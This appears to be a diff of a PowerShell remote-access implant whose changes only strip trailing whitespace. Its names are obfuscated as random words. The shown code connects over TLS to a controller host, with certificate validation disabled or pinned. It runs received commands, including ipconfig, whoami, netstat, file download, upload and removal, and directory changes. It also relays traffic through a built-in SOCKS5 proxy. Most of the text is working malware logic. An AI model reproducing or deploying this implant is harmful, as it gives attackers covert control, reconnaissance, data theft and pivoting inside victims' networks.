@@ -1,22 +1,22 @@
 $avenue = "1"
 $linguistic = [System.Convert]::FromBase64String("ON/RZIgaXg7bDoZXR45+msrJ+mo7AY2WkheHjQ0o0A8=")
 $firefighter = [System.Convert]::FromBase64String("PEHYpDIOzCnZL9fibT4oBw==")
-function laughter 
+function laughter
 {
     $fireworks = ipconfig /all | Out-String
     return $fireworks
 
 }
-function uncertainty 
+function uncertainty
 {
     param([string] $venture) # the file path on disk we want to download
-    
+
     $fireworks = Get-Content -Path $venture -Raw
 
     return $fireworks
 }
 
-function airplane 
+function airplane
 {
     param([string] $venture) # the uri to get from, and the place to save to
 
@@ -30,7 +30,7 @@ function neon
     $gallery = $fireworks.ToString()
 
     return $gallery
-    
+
 }
 function illuminate
 {
@@ -40,14 +40,14 @@ function illuminate
 
     return $fireworks
 }
-function melancholy 
+function melancholy
 {
     param([string] $crescendo) # the directory we are going to change to
 
     cd $crescendo
     return "Attempted to change to $crescendo."
 }
-function exuberant 
+function exuberant
 {
     param([string] $enchanting) # the item we want to remove
 
@@ -56,20 +56,20 @@ function exuberant
     return "Attempted to remove $enchanting."
 
 }
-function facility-tcp 
+function facility-tcp
 {
    $fireworks = Get-NetTCPConnection | Out-String
    return $fireworks
 }
-function telescope 
+function telescope
 {
     $fireworks = whoami /all | Out-String
     return $fireworks
 }
 [ScriptBlock]$avalanche = {
     param( $hovercraft )
-    
-    $octopus = 
+
+    $octopus =
     {
             param( $hovercraft )
             $hovercraft.inStream.CopyTo($hovercraft.outStream)
@@ -78,7 +78,7 @@ function telescope
 
     $juxtapose = $hovercraft.rsp
 
-    function quandary 
+    function quandary
     {
         param($quixotic)
         if ($quixotic -as [ipaddress])
@@ -102,11 +102,11 @@ function telescope
         $reverie.Read($esoteric, 0, 2) | Out-Null
 
         $rebellious = $esoteric[0]
-        
+
         if ($rebellious -eq 5)
         {
             $reverie.Read($esoteric, 2, $esoteric[1]) | Out-Null
-            for ($zoom = 2; $zoom -le $esoteric[1] + 1; $zoom++) 
+            for ($zoom = 2; $zoom -le $esoteric[1] + 1; $zoom++)
             {
                 if ($esoteric[$zoom] -eq 0) {break}
             }
@@ -174,12 +174,12 @@ function telescope
                 $esoteric[5] = 0
                 $reverie.Write($esoteric, 0, 10)
                 $reverie.Flush()
-                $hummingbird = $bravery.GetStream() 
+                $hummingbird = $bravery.GetStream()
                 $citadel = $hummingbird.CopyToAsync($reverie)
                 $rational = $reverie.CopyToAsync($hummingbird)
                 $rational.AsyncWaitHandle.WaitOne()
                 $citadel.AsyncWaitHandle.WaitOne()
-                
+
             }
             else
             {
@@ -208,7 +208,7 @@ function telescope
                 $reverie.Read($esoteric, 0, 1)
             }
             $bravery = New-Object System.Net.Sockets.TcpClient($kinetic, $jeweled)
-            
+
             if($bravery.Connected)
             {
                 $esoteric[0] = 0
@@ -217,7 +217,7 @@ function telescope
                 $esoteric[3] = 0
                 $reverie.Write($esoteric, 0, 8)
                 $reverie.Flush()
-                $hummingbird = $bravery.GetStream() 
+                $hummingbird = $bravery.GetStream()
                 $citadel = $hummingbird.CopyToAsync($reverie)
                 $rational = $reverie.CopyTo($hummingbird)
                 $rational.AsyncWaitHandle.WaitOne()
@@ -231,13 +231,13 @@ function telescope
     }
     catch {
     }
-    finally 
+    finally
     {
-        if ($dexterity -ne $null) 
+        if ($dexterity -ne $null)
         {
             $dexterity.Dispose()
         }
-        if ($bravery -ne $null) 
+        if ($bravery -ne $null)
         {
             $bravery.Dispose()
         }
@@ -253,7 +253,7 @@ function yourself{
             [Int] $relevant = 200,
             [Int] $passport = 0 )
 
-    try 
+    try
     {
 
         $vast = 0
@@ -270,7 +270,7 @@ function yourself{
             {
                 $dexterity = New-Object System.Net.Sockets.TcpClient($fortitude, $backpack)
                 $yucca = $dexterity.GetStream()
-                
+
                 if($fingerprint -eq '')
                 {
                     $reverie = New-Object System.Net.Security.SslStream($yucca, $false, ({$true} -as[Net.Security.RemoteCertificateValidationCallback]));
@@ -279,9 +279,9 @@ function yourself{
                 {
                     $reverie = New-Object System.Net.Security.SslStream($yucca, $false, ({return $mystical[1].GetCertHashString() -eq $fingerprint } -as[Net.Security.RemoteCertificateValidationCallback]));
                 }
-                
+
                 $reverie.AuthenticateAsClient($fortitude, $null, [Net.SecurityProtocolType]::Tls12, $false)
-                
+
                 Write-Host "Connected"
 
 
@@ -292,14 +292,14 @@ function yourself{
 
                 $alliance = [System.Text.Encoding]::Default.GetBytes("GET / HTTP/1.1`nHost: " + $fortitude + "`n`n")
                 $reverie.Write($alliance, 0, $alliance.Length)
-                
+
                 $reverie.ReadTimeout = 1000
                 $reverie.Read($knowledge, 0, 122) | Out-Null
-                
+
                 $reverie.Read($esoteric, 0, 5) | Out-Null
-                
+
                 $conductor = [System.Text.Encoding]::ASCII.GetString($esoteric)
-                
+
                 Write-Host $conductor
 
                 if($conductor -ne "HELLO")
@@ -343,12 +343,12 @@ function yourself{
     {
         write-host "Server closed."
 
-        if ($dexterity -ne $null) 
+        if ($dexterity -ne $null)
         {
             $dexterity.Dispose()
             $dexterity = $null
         }
-        if ($liberty -ne $null -and $eccentric -ne $null) 
+        if ($liberty -ne $null -and $eccentric -ne $null)
         {
             $liberty.EndInvoke($eccentric) | Out-Null
             $liberty.Runspace.Close()
@@ -369,9 +369,9 @@ function ornament
 
 function nectar
 {
-    param([string]$exemplary,     
-        [string]$angular,   
-        [string]$imagination)            
+    param([string]$exemplary,
+        [string]$angular,
+        [string]$imagination)
 
     if ($exemplary -eq "exit" -or $exemplary -eq "checkin")
     {
@@ -379,7 +379,7 @@ function nectar
     }
 	elseif($exemplary -eq "ipconfig")
 	{
-		$fireworks = laughter 
+		$fireworks = laughter
 	}
 	elseif($exemplary -eq "download")
 	{
@@ -395,7 +395,7 @@ function nectar
 	}
 	elseif($exemplary -eq "pwd")
 	{
-		$fireworks = illuminate 
+		$fireworks = illuminate
 	}
 	elseif($exemplary -eq "cd")
 	{
@@ -407,11 +407,11 @@ function nectar
 	}
 	elseif($exemplary -eq "netstat-tcp")
 	{
-		$fireworks = facility-tcp 
+		$fireworks = facility-tcp
 	}
 	elseif($exemplary -eq "whoami")
 	{
-		$fireworks = telescope 
+		$fireworks = telescope
 	}
 	elseif($exemplary -eq "socks")
 	{
@@ -501,18 +501,18 @@ function zenith
 
 function vigilant
 {
-    param($objective, 
-          $medicine,  
-          $electricity, $platinum)         
+    param($objective,
+          $medicine,
+          $electricity, $platinum)
 
-   
+
    $arithmetic = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($objective))
 
    $gorgeous = valuable $medicine $electricity $platinum
 
    $porcelain = 1
    for($xenon = 0; $xenon -lt $arithmetic.Length; $xenon++)
-   {        
+   {
         if($arithmetic[$xenon] -ne $gorgeous[$xenon])
         {
             $porcelain = 0
@@ -525,10 +525,10 @@ function vigilant
 function civilization
 {
     param($glistening,
-          $nebula, $banquet)         
+          $nebula, $banquet)
 
     $arithmetic = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($glistening))
-    
+
     $apple = zenith $arithmetic $nebula $banquet
 
 
@@ -539,9 +539,9 @@ function civilization
 function skyscraper
 {
 
-    param([string]$outlandish,        
-          [int]$earthquake,     
-          [int]$jungle)    
+    param([string]$outlandish,
+          [int]$earthquake,
+          [int]$jungle)
 
 
     $zealous = [Math]::Min($jungle, $outlandish.Length-$earthquake)
@@ -549,7 +549,7 @@ function skyscraper
     $marvelous = $outlandish.SubString($earthquake, $zealous)
 
     $blossom = $zealous + $earthquake
-    
+
     if($blossom -ge $outlandish.Length)
     {
         $blossom = "true"
@@ -579,7 +579,7 @@ function zigzag
     return $glistening
 }
 
-function animation 
+function animation
 {
 
     $jackpot = ""
@@ -628,7 +628,7 @@ function lavender
     for ($xenon = 0; $xenon -lt $milestone.Length; $xenon++)
     {
 
-        
+
 
         $exemplary = $milestone[$xenon]
 
@@ -636,12 +636,12 @@ function lavender
         {
 
             $diorama = $exemplary -split '<br>'
-    
+
             $authentic = $diorama[0]
             $peculiar = $diorama[1]
             $elaborate = $diorama[2]
             $earthquake = $diorama[3]
-            
+
             if($earthquake -eq 0)
             {
 
@@ -652,7 +652,7 @@ function lavender
             {
                 $fireworks = $diorama[4]
             }
-            
+
 
             $marvelous = (skyscraper $fireworks $earthquake $jungle) -split "<chnk>"
 
@@ -676,14 +676,14 @@ function lavender
                 exit
             }
 
-            
+
             if($earthquake -ne "true")
             {
                 $milestone[$xenon] = "$authentic<br>$peculiar<br>$elaborate<br>$earthquake<br>$fireworks"
                 $xylophone += $milestone[$xenon]
             }
 
-            
+
         }
 
     }
